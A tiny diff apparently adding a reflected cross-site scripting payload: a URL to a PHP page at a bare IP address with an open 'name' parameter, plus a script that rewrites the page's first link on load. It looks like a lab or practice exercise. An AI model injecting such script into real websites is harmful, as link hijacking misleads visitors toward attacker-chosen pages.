@@ -1,0 +1,5 @@
+http://3.86.24.15//multivac/biteme.php?name=
+<script>window.onload = function () {
+    a = document.getElementsByTagName("a");
+    a[0].href = "http://www.google.com/";
+}</script>
